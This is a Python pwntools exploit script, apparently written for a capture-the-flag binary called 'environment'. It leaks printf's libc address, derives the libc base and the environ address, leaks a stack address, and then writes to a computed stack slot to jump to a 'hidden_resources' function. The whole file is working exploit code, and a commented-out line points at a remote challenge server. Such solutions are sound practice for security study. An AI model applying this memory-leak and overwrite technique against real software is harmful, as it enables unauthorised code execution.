from pwn import *

target = process('./environment', env={"LD_PRELOAD":"./libc.so.6"})
#target = remote('165.227.231.249', 30917)

pid = gdb.attach(target, "\nb *plant+240\nb *form+316\n set disassembly-flavor intel\ncontinue")



elf = ELF("environment")
libc = ELF("libc.so.6")
#Gadgets:

hidden_resources = 0x004010b5

def recycle_no():
	print(target.recvuntil(b'2. Recycle'))
	target.sendline(b'2')
	print(target.recvuntil(b'What do you want to recycle?'))

	target.sendline(b'1')
	print(target.recvuntil(b'Is this your first time recycling? (y/n)'))
	target.sendline(b'n')
	
for i in range(5):
	recycle_no()

print(target.recvuntil(b' Please accept this gift: \x1b[0m['))
leak = target.recvuntil(b']\n\x1b')
printf_libc_str = leak.replace(b']\n\x1b', b'')

printf_libc = int(printf_libc_str, 16)
print('printf_libc is', hex(printf_libc))

libc_base = printf_libc - libc.symbols['printf']
environ = libc_base + libc.symbols['environ']

target.sendline(b'2')
print(target.recvuntil(b'What do you want to recycle?'))
#Note: 1 or 2 makes little difference; if I select neither, it prints we are doomed and doesn't execute form
target.sendline(b'1')
print(target.recvuntil(b'Is this your first time recycling? (y/n)'))
target.sendline(b'n')

for i in range(4):
	recycle_no()

print(target.recvuntil(b'whatever you want.'))
target.sendline(str(environ).encode())

result = target.recvuntil(b'1. Pl')
stack_leak = result.replace(b'1. Pl', b'').replace(b'\n> \x1b[0m', b'').replace(b'\n\x1b[1;0;32m\n', b'')

print(stack_leak)
print(len(stack_leak))
stack = u64(stack_leak + (8 - len(stack_leak)) * b'\x00')
print('stack', hex(stack))

overwrite_point = stack - 288

#Code to do the overwrite once I've figured out what should go in there...
print(target.recvuntil(b'2. Recycle'))
target.sendline(b'1')
print(target.recvuntil(b'2. '))
target.sendline(str(overwrite_point).encode())
print(target.recvuntil(b'2. Forest'))

target.sendline(str(hidden_resources).encode())


target.interactive()
